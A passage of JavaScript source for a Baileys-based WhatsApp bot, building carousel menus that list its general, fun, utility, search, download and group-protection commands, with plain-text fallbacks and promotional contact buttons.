            title: `${botName.toUpperCase()}`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔════════════════╗
╠❏ ${prefix}menu  
╠❏ ${prefix}help  
╠❏ ${prefix}ping
╠❏ ${prefix}ping2  
╠❏ ${prefix}ping3  
╠❏ ${prefix}uptime
╠❏ ${prefix}systeminfo  
╠❏ ${prefix}owner  
╠❏ ${prefix}tqto
╠❏ ${prefix}rules
╚══════════════════╝` },
                footer: { text: 'Page 1/3 • Basic commands' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📱 Contact Developer',
                                url: 'https://wa.me/254108595201'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '📢 Join Channel',
                                url: 'https://whatsapp.com/channel/0029VbCIYMV77qVODCql8W17'
                            })
                        }
                    ]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔════════════════╗ 
╠❏ ${prefix}credits  
╠❏ ${prefix}version
╠❏ ${prefix}botinfo  
╠❏ ${prefix}stats  
╠❏ ${prefix}about
╠❏ ${prefix}speed  
╠❏ ${prefix}check  
╠❏ ${prefix}status2
╠❏ ${prefix}whoami  
╠❏ ${prefix}myid  
╠❏ ${prefix}runtime
╚══════════════════╝` },
                footer: { text: 'Page 2/3 • Bot info' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🤖 Bot Version 3',
                                url: 'https://t.me/namelessmzaziv3Bot'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '🤖 Bot Version 4',
                                url: 'https://t.me/namelessmzaziv4bot'
                            })
                        }
                    ]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔════════════════╗
╠❏ ${prefix}vv  
╠❏ ${prefix}copy  
╠❏ ${prefix}echo  
╠❏ ${prefix}say
╠❏ ${prefix}greetings  
╠❏ ${prefix}hello  
╠❏ ${prefix}bye2
╠❏ ${prefix}goodmorning  
╠❏ ${prefix}goodnight
╠❏ ${prefix}goodevening  
╠❏ ${prefix}goodafternoon
╚══════════════════╝` },
                footer: { text: 'Page 3/3 • Fun replies' },
                nativeFlowMessage: {
                    buttons: [
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '👥 Join WhatsApp Group',
                                url: 'https://chat.whatsapp.com/JGt9kwmvsaEL177FvYZO4N'
                            })
                        },
                        {
                            name: 'cta_url',
                            buttonParamsJson: JSON.stringify({
                                display_text: '⭐ Rate Bot',
                                url: 'https://wa.me/254108595201?text=I%20love%20the%20bot!'
                            })
                        }
                    ]
                }
            }
        ];

        // Build carousel message – removed undefined pingMs
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `
╔═════════════════════╗
╠❏ BOT: ${botName.toUpperCase()}
╠❏ VERSION: ${version}
╠❏ OWNER: Mzazi Tech Inc
╠❏ STATUS: ONLINE
╠❏ USAGE: Swipe to Browse
╠❏ SECTOR: GENERAL MENU
╚═════════════════════` },
                    footer: { text: `© ${botName.toUpperCase()} • Tap any button` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted – safe
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('General menu carousel error:', error);
        
        // Fallback plain text list
        const fallbackText = `
📋 *${botName.toUpperCase()} - GENERAL MENU* 📋

╔═⟪ 📋 GENERAL ⟫═╗
╠❏ ${prefix}menu  
╠❏ ${prefix}help  
╠❏ ${prefix}ping
╠❏ ${prefix}ping2  
╠❏ ${prefix}ping3  
╠❏ ${prefix}uptime
╠❏ ${prefix}systeminfo  
╠❏ ${prefix}owner  
╠❏ ${prefix}tqto
╠❏ ${prefix}rules  
╠❏ ${prefix}credits  
╠❏ ${prefix}version
╠❏ ${prefix}botinfo  
╠❏ ${prefix}stats  
╠❏ ${prefix}about
╠❏ ${prefix}speed  
╠❏ ${prefix}check  
╠❏ ${prefix}status2
╠❏ ${prefix}whoami  
╠❏ ${prefix}myid  
╠❏ ${prefix}runtime
╠❏ ${prefix}vv  
╠❏ ${prefix}copy  
╠❏ ${prefix}echo  
╠❏ ${prefix}say
╠❏ ${prefix}greetings  
╠❏ ${prefix}hello  
╠❏ ${prefix}bye2
╠❏ ${prefix}goodmorning  
╠❏ ${prefix}goodnight
╠❏ ${prefix}goodevening  
╠❏ ${prefix}goodafternoon
╚══════════════════╝

© ${botName}`;
        await mzazireply(fallbackText);
    }
    break;
}
//=====================================//

    case "funmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • FUN & GAMES`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🎮 FUN & GAMES (1/4) ⟫═╗
╠❏ ${prefix}8ball  
╠❏ ${prefix}coinflip  
╠❏ ${prefix}dice
╠❏ ${prefix}rps  
╠❏ ${prefix}truth  
╠❏ ${prefix}dare
╠❏ ${prefix}wouldyourather  
╠❏ ${prefix}nhie
╠❏ ${prefix}trivia  
╠❏ ${prefix}riddle  
╠❏ ${prefix}game
╠❏ ${prefix}roast  
╠❏ ${prefix}compliment  
╠❏ ${prefix}flirt
╠❏ ${prefix}ship  
╠❏ ${prefix}howgay  
╠❏ ${prefix}howrich
╠❏ ${prefix}howstupid  
╠❏ ${prefix}iq  
╠❏ ${prefix}howcute
╠❏ ${prefix}rate  
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🎮 Play Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🎮 FUN & GAMES (2/4) ⟫═╗
╠❏ ${prefix}rng  
╠❏ ${prefix}choose
╠❏ ${prefix}poem  
╠❏ ${prefix}story  
╠❏ ${prefix}fortune
╠❏ ${prefix}rank  
╠❏ ${prefix}leaderboard  
╠❏ ${prefix}insult
╠❏ ${prefix}hug  
╠❏ ${prefix}kiss  
╠❏ ${prefix}slap
╠❏ ${prefix}punch  
╠❏ ${prefix}pat  
╠❏ ${prefix}wave
╠❏ ${prefix}dance  
╠❏ ${prefix}wink  
╠❏ ${prefix}stare
╠❏ ${prefix}highfive  
╠❏ ${prefix}poke  
╠❏ ${prefix}bite
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🎮 Play Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🎮 FUN & GAMES (3/4) ⟫═╗
╠❏ ${prefix}facepalm  
╠❏ ${prefix}shrug2  
╠❏ ${prefix}bow
╠❏ ${prefix}thumbsup  
╠❏ ${prefix}thumbsdown  
╠❏ ${prefix}gg
╠❏ ${prefix}rip  
╠❏ ${prefix}f  
╠❏ ${prefix}sus  
╠❏ ${prefix}lol
╠❏ ${prefix}omg  
╠❏ ${prefix}xd  
╠❏ ${prefix}nt  
╠❏ ${prefix}wp
╠❏ ${prefix}matrix  
╠❏ ${prefix}hackfake  
╠❏ ${prefix}glitch
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🎮 Play Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🎮 FUN & GAMES (4/4) ⟫═╗
╠❏ ${prefix}icebreaker  
╠❏ ${prefix}confess  
╠❏ ${prefix}ngl
╠❏ ${prefix}8ball  
╠❏ ${prefix}truth  
╠❏ ${prefix}dare
╠❏ ${prefix}wouldyourather
╠❏ ${prefix}howgay
╠❏ ${prefix}howrich
╠❏ ${prefix}howstupid
╠❏ ${prefix}iq
╠❏ ${prefix}howcute
╠❏ ${prefix}rate
╚══════════════════╝` },
                footer: { text: 'All commands are free to use' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🎮 Back to Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🎮 *${botName.toUpperCase()} - FUN & GAMES*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages • Tap a command to use it` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Fungames carousel error:', error);
        // Fallback: plain text list of all fun commands
        const allCommands = [
            "8ball", "coinflip", "dice", "rps", "truth", "dare", "wouldyourather", "nhie",
            "trivia", "riddle", "game", "roast", "compliment", "flirt", "ship", "howgay",
            "howrich", "howstupid", "iq", "howcute", "rate", "rng", "choose", "poem",
            "story", "fortune", "rank", "leaderboard", "insult", "hug", "kiss", "slap",
            "punch", "pat", "wave", "dance", "wink", "stare", "highfive", "poke", "bite",
            "facepalm", "shrug2", "bow", "thumbsup", "thumbsdown", "gg", "rip", "f", "sus",
            "lol", "omg", "xd", "nt", "wp", "matrix", "hackfake", "glitch", "icebreaker",
            "confess", "ngl"
        ];
        let fallback = `🎮 *${botName.toUpperCase()} - FUN & GAMES*\n\n`;
        allCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}

//=====================================//

case "utilitymenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • UTILITY TOOLS`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🔧 UTILITY TOOLS (1/3) ⟫═╗
╠❏ ${prefix}calc  
╠❏ ${prefix}math  
╠❏ ${prefix}qr
╠❏ ${prefix}base64encode  
╠❏ ${prefix}base64decode
╠❏ ${prefix}hex  
╠❏ ${prefix}unhex  
╠❏ ${prefix}binary
╠❏ ${prefix}md5  
╠❏ ${prefix}sha1  
╠❏ ${prefix}sha256
╠❏ ${prefix}password  
╠❏ ${prefix}uuid  
╠❏ ${prefix}gpass
╠❏ ${prefix}charcount  
╠❏ ${prefix}reverse  
╠❏ ${prefix}uppercase
╠❏ ${prefix}lowercase  
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔧 Try Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🔧 UTILITY TOOLS (2/3) ⟫═╗
╠❏ ${prefix}repeat  
╠❏ ${prefix}mocktext
╠❏ ${prefix}morse  
╠❏ ${prefix}unmorse  
╠❏ ${prefix}clap
╠❏ ${prefix}vaporwave  
╠❏ ${prefix}zalgo  
╠❏ ${prefix}bold
╠❏ ${prefix}italic  
╠❏ ${prefix}strike  
╠❏ ${prefix}mono
╠❏ ${prefix}shorturl  
╠❏ ${prefix}ip  
╠❏ ${prefix}ipinfo
╠❏ ${prefix}time  
╠❏ ${prefix}date  
╠❏ ${prefix}countdown
╠❏ ${prefix}timestamp  
╠❏ ${prefix}weekday  
╠❏ ${prefix}year
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔧 Try Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🔧 UTILITY TOOLS (3/3) ⟫═╗
╠❏ ${prefix}age  
╠❏ ${prefix}todo  
╠❏ ${prefix}note
╠❏ ${prefix}reminder  
╠❏ ${prefix}flashcard
╠❏ ${prefix}generate  
╠❏ ${prefix}color  
╠❏ ${prefix}ascii
╠❏ ${prefix}extractemails  
╠❏ ${prefix}extractnumbers
╠❏ ${prefix}math  
╠❏ ${prefix}calc
╠❏ ${prefix}qr
╠❏ ${prefix}shorturl
╚══════════════════╝` },
                footer: { text: 'All tools are free' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🔧 *${botName.toUpperCase()} - UTILITY TOOLS*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Utility menu carousel error:', error);
        // Fallback plain text list
        const utilityCommands = [
            "calc", "math", "qr", "base64encode", "base64decode", "hex", "unhex", "binary",
            "md5", "sha1", "sha256", "password", "uuid", "gpass", "charcount", "reverse",
            "uppercase", "lowercase", "repeat", "mocktext", "morse", "unmorse", "clap",
            "vaporwave", "zalgo", "bold", "italic", "strike", "mono", "shorturl", "ip",
            "ipinfo", "time", "date", "countdown", "timestamp", "weekday", "year", "age",
            "todo", "note", "reminder", "flashcard", "generate", "color", "ascii",
            "extractemails", "extractnumbers"
        ];
        let fallback = `🔧 *${botName.toUpperCase()} - UTILITY TOOLS*\n\n`;
        utilityCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

case "searchmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • SEARCH & INFO`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🌍 SEARCH & INFO (1/3) ⟫═╗
╠❏ ${prefix}wiki  
╠❏ ${prefix}dict  
╠❏ ${prefix}synonym
╠❏ ${prefix}define  
╠❏ ${prefix}translate  
╠❏ ${prefix}weather
╠❏ ${prefix}country  
╠❏ ${prefix}timezone  
╠❏ ${prefix}currency
╠❏ ${prefix}crypto  
╠❏ ${prefix}horoscope  
╠❏ ${prefix}flag
╠❏ ${prefix}capital  
╠❏ ${prefix}phonecode  
╠❏ ${prefix}continent
╠❏ ${prefix}numberfact  
╠❏ ${prefix}dayfact  
╠❏ ${prefix}fact
╠❏ ${prefix}scifact  
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔍 Search Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🌍 SEARCH & INFO (2/3) ⟫═╗
╠❏ ${prefix}catfact  
╠❏ ${prefix}dogfact
╠❏ ${prefix}chucknorris  
╠❏ ${prefix}joke  
╠❏ ${prefix}advice
╠❏ ${prefix}quote  
╠❏ ${prefix}motivation  
╠❏ ${prefix}github
╠❏ ${prefix}bible  
╠❏ ${prefix}quran  
╠❏ ${prefix}hadith
╠❏ ${prefix}dua  
╠❏ ${prefix}proverb  
╠❏ ${prefix}history
╠❏ ${prefix}geography  
╠❏ ${prefix}internet  
╠❏ ${prefix}tech
╠❏ ${prefix}space  
╠❏ ${prefix}ocean  
╠❏ ${prefix}africa
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔍 Search Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🌍 SEARCH & INFO (3/3) ⟫═╗
╠❏ ${prefix}kenya  
╠❏ ${prefix}travel  
╠❏ ${prefix}nature
╠❏ ${prefix}word  
╠❏ ${prefix}poem  
╠❏ ${prefix}ai
╠❏ ${prefix}blockchain  
╠❏ ${prefix}cybersecurity
╠❏ ${prefix}wiki  
╠❏ ${prefix}weather
╠❏ ${prefix}country
╠❏ ${prefix}translate
╚══════════════════╝` },
                footer: { text: 'Explore the world with these commands' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🌍 *${botName.toUpperCase()} - SEARCH & INFO*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Search menu carousel error:', error);
        // Fallback plain text list
        const searchCommands = [
            "wiki", "dict", "synonym", "define", "translate", "weather", "country", "timezone",
            "currency", "crypto", "horoscope", "flag", "capital", "phonecode", "continent",
            "numberfact", "dayfact", "fact", "scifact", "catfact", "dogfact", "chucknorris",
            "joke", "advice", "quote", "motivation", "github", "bible", "quran", "hadith",
            "dua", "proverb", "history", "geography", "internet", "tech", "space", "ocean",
            "africa", "kenya", "travel", "nature", "word", "poem", "ai", "blockchain", "cybersecurity"
        ];
        let fallback = `🌍 *${botName.toUpperCase()} - SEARCH & INFO*\n\n`;
        searchCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}

//=====================================//

case "downloadmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • MEDIA & DOWNLOAD`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 📱 MEDIA & DOWNLOAD (1/2) ⟫═╗
╠❏ ${prefix}sticker  
╠❏ ${prefix}s  
╠❏ ${prefix}toimg
╠❏ ${prefix}emojimix  
╠❏ ${prefix}take  
╠❏ ${prefix}steal
╠❏ ${prefix}play  
╠❏ ${prefix}play2  
╠❏ ${prefix}lyrics
╠❏ ${prefix}lyrics2  
╠❏ ${prefix}yts  
╠❏ ${prefix}ytinfo
╠❏ ${prefix}tiktok  
╠❏ ${prefix}img  
╠❏ ${prefix}gif
╠❏ ${prefix}pp  
╠❏ ${prefix}vcard  
╠❏ ${prefix}location
╠❏ ${prefix}nairobi  
╠❏ ${prefix}mombasa
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '📥 Download Now',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 📱 MEDIA & DOWNLOAD (2/2) ⟫═╗
╠❏ ${prefix}instagram  
╠❏ ${prefix}facebook  
╠❏ ${prefix}twitter
╠❏ ${prefix}song  
╠❏ ${prefix}movie  
╠❏ ${prefix}series
╠❏ ${prefix}anime  
╠❏ ${prefix}manga  
╠❏ ${prefix}book
╠❏ ${prefix}screenshot2  
╠❏ ${prefix}sticker2
╠❏ ${prefix}play  
╠❏ ${prefix}play2
╠❏ ${prefix}tiktok
╠❏ ${prefix}img
╠❏ ${prefix}gif
╚══════════════════╝` },
                footer: { text: 'All download commands are free' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `📥 *${botName.toUpperCase()} - MEDIA & DOWNLOAD*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Download menu carousel error:', error);
        // Fallback plain text list
        const downloadCommands = [
            "sticker", "s", "toimg", "emojimix", "take", "steal", "play", "play2", "lyrics",
            "lyrics2", "yts", "ytinfo", "tiktok", "img", "gif", "pp", "vcard", "location",
            "nairobi", "mombasa", "instagram", "facebook", "twitter", "song", "movie", "series",
            "anime", "manga", "book", "screenshot2", "sticker2"
        ];
        let fallback = `📥 *${botName.toUpperCase()} - MEDIA & DOWNLOAD*\n\n`;
        downloadCommands.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}
//=====================================//

  case "protectionmenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
            }
        }

        const commonHeader = {
            title: `${botName.toUpperCase()} • GROUP PROTECTION`,
            hasMediaAttachment: !!preparedImage,
            ...(preparedImage ? { imageMessage: preparedImage } : {})
        };

        const cards = [
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🛡️ GROUP PROTECTION (1/3) ⟫═╗
╠❏ ${prefix}antilink delete|warn|kick|off
╠❏ ${prefix}antisticker delete|warn|kick|off
╠❏ ${prefix}antiimage delete|warn|kick|off
╠❏ ${prefix}antitag on/off  
╠❏ ${prefix}antibot on/off
╠❏ ${prefix}antiviewonce on/off  
╚══════════════════╝
⚠️ Modes: delete/warn/kick/off
• warn = 3 warnings → auto-kick` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🛡️ Protect Group',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.menu'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🛡️ GROUP PROTECTION (2/3) ⟫═╗
╠❏ ${prefix}antidelete on/off
╠❏ ${prefix}antitagadmin on/off
╠❏ ${prefix}antimentiongroup on/off
╠❏ ${prefix}antipromote on/off
╠❏ ${prefix}antidemote on/off
╠❏ ${prefix}antiflood on/off  
╠❏ ${prefix}antibadword on/off  
╚══════════════════╝` },
                footer: { text: 'Swipe ➡️ for more' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            },
            {
                header: commonHeader,
                body: { text: `
╔═⟪ 🛡️ GROUP PROTECTION (3/3) ⟫═╗
╠❏ ${prefix}antigif on/off  
╠❏ ${prefix}antivideo on/off  
╠❏ ${prefix}antiaudio on/off
╠❏ ${prefix}antinsfw on/off  
╠❏ ${prefix}anticall on/off
╠❏ ${prefix}warn @user reason
╠❏ ${prefix}resetwarn @user
╠❏ ${prefix}mywarn
╚══════════════════╝` },
                footer: { text: 'Enable/disable with: command on/off' },
                nativeFlowMessage: {
                    buttons: [{
                        name: 'cta_url',
                        buttonParamsJson: JSON.stringify({
                            display_text: '🔙 Main Menu',
                            url: 'https://wa.me/' + botPhoneNum + '?text=.repo'
                        })
                    }]
                }
            }
        ];

        // Build carousel message
        const interactiveMsg = generateWAMessageFromContent(
            chatId,
            {
                interactiveMessage: {
                    body: { text: `🛡️ *${botName.toUpperCase()} - GROUP PROTECTION*` },
                    footer: { text: `Swipe ➡️ to see all ${cards.length} pages` },
                    carouselMessage: { cards },
                    contextInfo: {}
                }
            },
            {} // No quoted
        );

        await mzazi.relayMessage(chatId, interactiveMsg.message, {
            messageId: interactiveMsg.key.id
        });

    } catch (error) {
        logger.error('Group protection carousel error:', error);
        // Fallback plain text list
        let fallback = `🛡️ *${botName.toUpperCase()} - GROUP PROTECTION*\n\n`;
        fallback += `🔗 *Advanced Anti-Link* (delete|warn|kick|off)\n`;
        fallback += `• ${prefix}antilink delete/warn/kick/off\n\n`;
        fallback += `🩹 *Anti-Sticker* (delete|warn|kick|off)\n`;
        fallback += `• ${prefix}antisticker delete/warn/kick/off\n\n`;
        fallback += `🖼️ *Anti-Image* (delete|warn|kick|off)\n`;
        fallback += `• ${prefix}antiimage delete/warn/kick/off\n\n`;
        fallback += `🗑️ *Anti-Delete*\n`;
        fallback += `• ${prefix}antidelete on/off\n\n`;
        fallback += `Other toggles (on/off):\n`;
        const otherCmds = ["antitag", "antibot", "antiviewonce", "antitagadmin", "antimentiongroup", "antipromote", "antidemote", "antiflood", "antibadword", "antigif", "antivideo", "antiaudio", "antinsfw", "anticall"];
        otherCmds.forEach(cmd => { fallback += `• ${prefix}${cmd}\n`; });
        fallback += `\n⚠️ warn mode: 3 warnings → auto-kick\n© ${botName}`;
        await mzazireply(fallback);
    }
    break;
}


//=====================================//

case "automenu": {
    const chatId = sender;
    const { generateWAMessageContent, generateWAMessageFromContent } = require('@whiskeysockets/baileys');

    try {
        // Load menu image
        const customMenuPic = `./database/sessions/${botPhoneNum}/menu.jpg`;
        const defaultMenuPic = "./media/menu.jpg";
        const menuPicPath = fs.existsSync(customMenuPic) ? customMenuPic : defaultMenuPic;

        let preparedImage = null;
        if (fs.existsSync(menuPicPath)) {
            const imageBuffer = fs.readFileSync(menuPicPath);
            const imgContent = await generateWAMessageContent(
                { image: imageBuffer },
                { upload: mzazi.waUploadToServer }
            );
            if (imgContent?.imageMessage) {
                preparedImage = imgContent.imageMessage;
